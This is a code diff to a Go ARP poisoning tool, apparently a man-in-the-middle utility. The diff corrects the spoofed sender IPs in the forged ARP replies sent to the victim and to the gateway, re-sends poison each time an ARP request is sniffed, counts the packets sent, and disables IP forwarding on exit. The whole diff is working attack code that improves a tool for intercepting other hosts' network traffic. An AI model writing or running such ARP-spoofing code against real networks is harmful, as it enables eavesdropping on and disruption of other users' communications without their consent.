@@ -43,13 +43,13 @@ type arpPoison struct {
 	ctx       context.Context
 	cancel    context.CancelFunc
 	dissec   *packet.PacketDissector
+	idpkg     uint
 }
 
 
 
 type addresses struct {
 	myMAC      net.HardwareAddr
-	myIP       net.IP
 	targetMAC  net.HardwareAddr
 	targetIP   net.IP
 	apMAC	   net.HardwareAddr
@@ -81,7 +81,6 @@ func newArpPoison(args []string) *arpPoison {
 func setAddrs(parser *arpPoisonParser, iface *net.Interface) addresses {
 	return addresses{
 		myMAC     : iface.HardwareAddr,
-		myIP      : sysconf.MustIPv4(iface),
 		targetMAC : parser.targetMAC,
 		targetIP  : parser.targetIP,
 		apMAC     : sysconf.MustGatewayMAC(iface),
@@ -98,6 +97,7 @@ func (ap *arpPoison) execute() {
 	ap.sendInitialPoisoning()
 	ap.sniffTargetsTraffic()
 	ap.stopTools()
+	sysconf.MustDisableIPForwarding()
 }
 
 
@@ -134,6 +134,7 @@ func (ap *arpPoison) initPoisoningTools() {
 	ap.socket  = sockets.NewL2Socket(&ap.iface)
 	ap.builder = packet.NewArpPkt()
 	ap.builder.SetReplyOpcode()
+	ap.setFixedPktData()
 }
 
 
@@ -142,13 +143,13 @@ func (ap *arpPoison) setFixedPktData() {
 	ap.builder.SetReplyOpcode()
 	ap.builder.EtherHdr.SetSrcAddr(ap.addrs.myMAC)
 	ap.builder.SetSenderMAC(ap.addrs.myMAC)
-	ap.builder.SetSenderIP(ap.addrs.myIP)
 }
 
 
 
 func (ap *arpPoison) setPoisonToTarget() {
 	ap.builder.EtherHdr.SetDstAddr(ap.addrs.targetMAC)
+	ap.builder.SetSenderIP(ap.addrs.apIP)
 	ap.builder.SetTargetMAC(ap.addrs.targetMAC)
 	ap.builder.SetTargetIP(ap.addrs.targetIP)
 }
@@ -157,6 +158,7 @@ func (ap *arpPoison) setPoisonToTarget() {
 
 func (ap *arpPoison) setPoisonToAP() {
 	ap.builder.EtherHdr.SetDstAddr(ap.addrs.apMAC)
+	ap.builder.SetSenderIP(ap.addrs.targetIP)
 	ap.builder.SetTargetMAC(ap.addrs.apMAC)
 	ap.builder.SetTargetIP(ap.addrs.apIP)
 }
@@ -204,34 +206,23 @@ func (ap *arpPoison) sniffTargetsTraffic() {
 			if !ok { return }
 			
 			ap.dissec.UpdatePkt(pkt)
-			ap.processPkt()
+			ap.sendRequestedPoison()
 		}
 	}
 }
 
 
 
-func (ap *arpPoison) processPkt() {
-	if ap.dissec.IsArpRequest() {
-		ap.sendRequestedPoison()
+func (ap *arpPoison) sendRequestedPoison() {
+	if !ap.dissec.IsArpRequest() {
 		return
 	}
 
-	srcIP, ok1 := ap.dissec.GetSrcIP()
-	if !ok1 { return }
-	
-	dstIP, ok2 := ap.dissec.GetDstIP()
-	if !ok2 { return }
-
-	fmt.Printf("\n%s -> %s", srcIP.String(), dstIP.String())
-}
-
-
-
-func (ap *arpPoison) sendRequestedPoison() {
 	ap.setPoisonToTarget()
 	ap.sendPoison()
-	fmt.Printf("Poison sent to target %s", ap.addrs.targetIP.String())
+
+	ap.idpkg++
+	fmt.Printf("%d Poison sent to target %s\n", ap.idpkg, ap.addrs.targetIP.String())
 }
 
 
